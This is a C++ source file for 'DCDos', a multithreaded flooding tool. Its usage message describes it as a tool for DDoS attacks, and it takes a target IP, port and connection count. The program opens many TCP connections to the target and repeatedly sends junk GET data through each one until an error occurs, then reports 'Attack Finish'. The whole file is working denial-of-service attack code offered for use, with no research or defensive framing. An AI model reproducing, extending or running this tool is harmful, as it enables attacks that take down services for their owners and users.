#include"DCInfoT.h"
#include<stdio.h>
#include<pthread.h>
#include<time.h>
short port;
short count;
char*Adr;
DCInfo *dosEle;
DCDNodeT<int> AvaEle;
pthread_t TId[2];
int ConnCom=0;
pthread_mutex_t mut;
char*WideData="GET XXXXXXXXXXXXX";
void* SendThread(void*arg);
int ConnErr=0,SendErr=0;
//DCDos 	
int iC=0;	
void* ConnectThread(void*arg){
	
	
	for(iC=0;iC<count;iC++){
		dosEle[iC].SetIsServer(false);
		dosEle[iC].SetAddress(Adr);
		dosEle[iC].SetPort(port);
		dosEle[iC].ClientInit();
		dosEle[iC].ClientConn();
		if(dosEle[iC].IsError!=true){
			AvaEle[ConnCom]=iC;
			ConnCom++;
			pthread_create(&TId[1],NULL,SendThread,(void*)iC);
		}
		else{
			ConnErr++;
		}
	}
	
	return (void*)8;
}
void* SendThread(void*arg){
	for(int e=0;e<2000;e++)
	for(int i=0;i<2000;i++){
			dosEle[(long)arg].Send(WideData,3000);
			if(dosEle[(long)arg].IsError==true){
				i=2000,e=2000;
				SendErr++;
				usleep(100);
			}
		}
		
	return (void*)8;
}
int main(int argc,char**argv){
	DCInfo ChCon;
	if(argc<4){
		printf("parameters error!\n");
		printf("Info:DCDos is a tool using tcp//ip for ddos attack may have some bug.\n\
Usage:DCDos <ip> <dp> <cc>\n\tip:IP or DNS\n\tdp:Attack Port\n\tcc:Connections Count\n");
		return 0;
	}
	Adr=argv[1];
	port=(short)atoi(argv[2]);
	count=(short)atoi(argv[3]);
	
	ChCon.SetIsServer(false);
	ChCon.SetAddress(argv[1]);
	ChCon.SetPort(port);
	ChCon.ClientInit();
	ChCon.ClientConn();
	
	if(ChCon.IsError==true){
		printf("parameters error!\n");
		printf("Info:DCDos is a tool using tcp//ip for ddos attack may have some bug.\n\
Usage:DCDos <ip> <dp> <cc>\n\tip:IP or DNS\n\tdp:Attack Port\n\tcc:Connections Count\n");
		return 0;
	}
	printf("Des port:%d Connection Count:%d\n",port,count);
	dosEle=new DCInfo[count];
	pthread_mutex_init(&mut,NULL);
	if((pthread_create(&TId[0],NULL,ConnectThread,NULL))!=0){
		printf("Error!\n");
	}
	pthread_join(TId[0],NULL);
	printf("Conn Error:%d Send Error:%d\n",ConnErr,SendErr);
	printf("Attack Finish...\n");
	return 0;
}
